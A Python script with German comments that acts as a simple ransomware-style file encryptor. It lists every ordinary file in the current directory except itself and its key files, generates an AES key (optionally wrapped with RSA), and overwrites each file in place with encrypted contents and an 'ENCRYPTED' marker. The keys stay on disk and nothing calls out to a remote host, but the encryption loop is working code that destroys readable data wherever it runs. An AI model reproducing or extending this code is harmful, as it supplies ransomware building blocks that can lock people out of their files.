#!/usr/bin/env python3

import os
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes

# Marker zur Kennzeichnung verschlüsselter Dateien
MARKER = "ENCRYPTED"

# AES Schlüssel generieren
def generate_aes_key():
    return os.urandom(32)

# AES verschlüsseln
def aes_encrypt(key, data):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = iv + encryptor.update(data) + encryptor.finalize()
    return encrypted_data

# RSA Schlüssel generieren
def generate_rsa_key():
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    return private_key

# RSA verschlüsseln
def rsa_encrypt(public_key, data):
    encrypted_data = public_key.encrypt(
        data,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted_data

# Überprüfen, ob Dateien bereits verschlüsselt sind
def check_if_encrypted():
    files = [file for file in os.listdir() if os.path.isfile(file) and file not in ("voldemort.py", "thekey.key", "decrypt.py", "aes_key.enc") and not file.startswith('.')]
    for file in files:
        with Path(file).open("rb") as thefile:
            if MARKER.encode() in thefile.read():
                print(f"{file} ist bereits verschlüsselt.")
                return False
    return True

# Hauptfunktion zur Auswahl des Verschlüsselungsalgorithmus
def main():
    print("Wählen den Verschlüsselungsalgorithmus:")
    print("1. AES")
    print("2. RSA")
    choice = input("Deine Wahl (1 oder 2): ")

    if choice == "1" and check_if_encrypted():
        aes_key = generate_aes_key()
        with open("thekey.key", "wb") as key_file:
            key_file.write(aes_key)
        encrypt_func = lambda data: aes_encrypt(aes_key, data)
        print("AES Schlüssel generiert.")
    elif choice == "2" and check_if_encrypted():
        aes_key = generate_aes_key()
        rsa_key = generate_rsa_key()
        with open("thekey.key", "wb") as key_file:
            key_file.write(rsa_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()
            ))
        public_key = rsa_key.public_key()
        encrypted_aes_key = rsa_encrypt(public_key, aes_key)
        with open("aes_key.enc", "wb") as key_file:
            key_file.write(encrypted_aes_key)
        encrypt_func = lambda data: aes_encrypt(aes_key, data)
        print("RSA Schlüssel generiert.")
    else:
        print("Ungültige Wahl!")
        return

    # Dateien verschlüsseln
    files = [file for file in os.listdir() if os.path.isfile(file) and file not in ("voldemort.py", "thekey.key", "decrypt.py", "aes_key.enc") and not file.startswith('.')]
    print("Files to encrypt:", files)

    for file in files:
        file_path = Path(file)
        with file_path.open("rb") as thefile:
            contents = thefile.read()
        if MARKER.encode() in contents:
            print(f"{file} ist bereits verschlüsselt.")
            continue
        encrypted_data = encrypt_func(contents) + MARKER.encode()
        with file_path.open("wb") as thefile:
            thefile.write(encrypted_data)

    print("Files successfully encrypted.")

if __name__ == "__main__":
    main()
